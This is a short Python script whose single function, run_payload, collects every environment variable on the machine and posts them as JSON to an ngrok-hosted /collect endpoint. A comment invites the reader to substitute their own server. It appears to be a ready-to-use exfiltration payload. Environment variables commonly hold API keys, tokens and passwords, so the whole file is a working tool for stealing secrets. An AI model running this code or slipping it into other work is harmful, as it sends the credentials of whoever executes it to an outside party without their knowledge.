import os
import requests

def run_payload():
    # Fetch all environment variables
    env_vars = os.environ

    # URL to send the data to (replace <your-ngrok-url> with your actual server endpoint)
    url = "https://5cecdbdb0328.ngrok.app/collect"

    # Send environment variables as JSON to the server
    try:
        response = requests.post(url, json=dict(env_vars))
        if response.status_code == 200:
            print("Environment variables sent successfully")
        else:
            print("Failed to send environment variables")
    except Exception as e:
        print(f"Error occurred: {e}")
